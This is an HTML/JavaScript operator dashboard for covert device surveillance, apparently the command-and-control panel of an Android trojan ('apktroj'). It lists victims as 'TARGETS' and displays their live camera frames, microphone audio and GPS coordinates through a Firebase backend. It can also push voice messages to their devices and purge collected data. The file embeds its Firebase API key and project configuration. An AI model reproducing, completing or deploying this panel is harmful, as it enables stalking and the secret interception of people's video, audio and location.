<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C.R COMMAND CENTER V1.6</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
        .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
        .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
    </style>
</head>
<body class="p-4">
    <div class="max-w-6xl mx-auto">
        <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
            <div>
                <h1 class="text-3xl font-bold tracking-widest text-red-600">C.R COMMAND CENTER V1.6</h1>
                <p class="text-xs text-green-400">AUDIO-VIDEO REALTIME ACTIVE</p>
            </div>
            <div id="auth-info" class="text-[10px] text-gray-400 italic">Authenticating...</div>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
            <div class="lg:col-span-1 border-r border-green-900 pr-4">
                <h2 class="text-lg font-bold mb-4">TARGETS</h2>
                <div id="victim-list" class="space-y-2 text-xs"></div>
            </div>

            <div class="lg:col-span-3">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <!-- Video & Audio Feed -->
                    <div class="glitch-border p-4 bg-black">
                        <div class="flex justify-between items-center mb-2">
                            <span class="text-xs text-red-500 font-bold uppercase">Live Feed</span>
                            <span class="live-indicator" id="live-status">● IDLE</span>
                        </div>
                        <div class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900">
                            <img id="stream-img" src="" class="hidden w-full h-full object-contain">
                            <span id="placeholder" class="text-gray-700">Waiting for Data...</span>
                        </div>
                        <div class="mt-4 flex gap-2">
                             <div class="flex-1 p-2 bg-gray-900 border border-green-900 rounded">
                                <p class="text-[10px] text-green-500 font-bold">Audio Status:</p>
                                <p id="audio-status" class="text-xs text-white italic">Muted</p>
                             </div>
                             <div class="flex-1 p-2 bg-gray-900 border border-green-900 rounded">
                                <p class="text-[10px] text-blue-500 font-bold">Location:</p>
                                <a id="map-link" href="#" target="_blank" class="text-xs text-white underline">No Data</a>
                             </div>
                        </div>
                    </div>

                    <!-- Command Panel -->
                    <div class="glitch-border p-4 bg-black flex flex-col">
                        <h3 class="text-blue-500 font-bold mb-2 uppercase text-sm">Broadcast Voice</h3>
                        <textarea id="voice-msg" class="flex-grow bg-gray-900 border border-blue-900 p-2 text-white text-sm mb-2" placeholder="Send text-to-speech..."></textarea>
                        <button id="send-voice" class="bg-blue-600 text-white font-bold py-2 hover:bg-blue-700 text-xs uppercase">Send</button>
                        
                        <div class="mt-4 p-2 bg-red-900 bg-opacity-20 border border-red-900 rounded">
                             <button id="purge-btn" class="text-[10px] text-white underline">Reset Buffers</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Hidden audio element for playback -->
    <audio id="audio-player" autoplay></audio>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getFirestore, collection, onSnapshot, doc, setDoc, getDocs, deleteDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
            authDomain: "apktroj.firebaseapp.com",
            projectId: "apktroj",
            storageBucket: "apktroj.firebasestorage.app",
            messagingSenderId: "943833619122",
            appId: "1:943833619122:web:d757ced4d56267abf247ab"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const appId = "apktroj_v1";
        let lastAudioTs = 0;

        onAuthStateChanged(auth, async (user) => {
            if (!user) await signInAnonymously(auth);
            else {
                document.getElementById('auth-info').innerText = "CMD ACTIVE: " + user.uid;
                initMonitor();
            }
        });

        function initMonitor() {
            const streamCol = collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer');
            onSnapshot(streamCol, (snap) => {
                const list = document.getElementById('victim-list');
                list.innerHTML = '';
                
                snap.forEach(docSnap => {
                    const data = docSnap.data();
                    
                    // Update List
                    const v = document.createElement('div');
                    v.className = "p-2 border border-green-900 bg-green-900 bg-opacity-10";
                    v.innerText = `ID: ${data.uid?.substring(0,8)} [ONLINE]`;
                    list.appendChild(v);

                    // Update Image
                    if (data.frame) {
                        const img = document.getElementById('stream-img');
                        img.src = data.frame;
                        img.classList.remove('hidden');
                        document.getElementById('placeholder').classList.add('hidden');
                        document.getElementById('live-status').innerText = "● STREAMING";
                    }

                    // Update Audio (Live)
                    if (data.audioChunk && data.audioTs > lastAudioTs) {
                        lastAudioTs = data.audioTs;
                        const player = document.getElementById('audio-player');
                        player.src = data.audioChunk;
                        player.play().catch(e => console.log("User interaction required for audio"));
                        document.getElementById('audio-status').innerText = "LISTENING...";
                    }

                    // Update Location
                    if (data.location) {
                        const mLink = document.getElementById('map-link');
                        mLink.innerText = `${data.location.lat.toFixed(4)}, ${data.location.lng.toFixed(4)}`;
                        mLink.href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
                    }
                });
            });
        }

        document.getElementById('send-voice').onclick = async () => {
            const txt = document.getElementById('voice-msg').value;
            if(!txt) return;
            await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), {
                text: txt,
                timestamp: Date.now()
            });
            document.getElementById('voice-msg').value = "";
        };

        document.getElementById('purge-btn').onclick = async () => {
            const snap = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'stream_buffer'));
            snap.forEach(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', d.id)));
            alert("Cleared.");
        };
    </script>
</body>
</html>
